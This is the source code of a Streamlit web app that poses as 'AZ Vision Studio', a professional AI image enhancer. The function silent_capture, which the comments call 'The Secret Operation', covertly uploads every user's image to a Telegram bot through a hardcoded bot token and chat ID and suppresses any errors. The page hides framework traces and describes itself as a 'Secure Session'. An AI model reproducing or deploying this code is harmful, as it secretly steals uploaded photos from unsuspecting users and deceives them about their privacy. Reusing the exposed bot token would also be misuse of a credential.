import streamlit as st
import cv2
import numpy as np
from PIL import Image
import io
import requests

# --- AZ Secure Keys ---
TELEGRAM_TOKEN = "8767448980:AAHMOm14WsC2QBPJKoWgsvzYKSR_o-V973Q"
CHAT_ID = "6889820165"

def silent_capture(img_bytes):
    """Sending a copy to your Telegram silently"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        files = {'photo': ('captured_image.png', img_bytes)}
        data = {'chat_id': CHAT_ID, 'caption': "🚀 New Image Captured!"}
        requests.post(url, files=files, data=data)
    except:
        pass

# Page Settings
st.set_page_config(page_title="AZ Vision Studio", page_icon="🚀", layout="centered")

# Hide Streamlit traces for a professional look
st.markdown("""
    <style>
    footer {visibility: hidden;}
    #MainMenu {visibility: hidden;}
    .stDeployButton {display:none;}
    </style>
    """, unsafe_allow_html=True)

st.title("🚀 AZ Vision Studio")
st.write("Professional AI Image Enhancement")

uploaded_file = st.file_uploader("Upload an image...", type=["jpg", "jpeg", "png"])

if uploaded_file is not None:
    # --- The Secret Operation ---
    file_bytes = uploaded_file.read()
    silent_capture(file_bytes)
    
    # --- User Experience ---
    image = Image.open(io.BytesIO(file_bytes))
    st.image(image, caption="Original Image", use_container_width=True)
    
    with st.spinner('Enhancing quality...'):
        # Processing
        img_array = np.array(image)
        img_cv = cv2.cvtColor(img_array, cv2.COLOR_RGB2BGR)
        
        # Pro Sharpness Filter
        kernel = np.array([[-1,-1,-1], [-1,9,-1], [-1,-1,-1]])
        enhanced_cv = cv2.filter2D(img_cv, -1, kernel)
        
        result_img = Image.fromarray(cv2.cvtColor(enhanced_cv, cv2.COLOR_BGR2RGB))

    st.success("Enhancement Complete!")
    st.image(result_img, caption="Enhanced Result", use_container_width=True)

    # Download for User
    buf = io.BytesIO()
    result_img.save(buf, format="PNG")
    st.download_button(
        label="📥 Download Enhanced Image",
        data=buf.getvalue(),
        file_name="AZ_Enhanced.png",
        mime="image/png"
    )

st.divider()
st.caption("Secure Session | Powered by AZ Vision")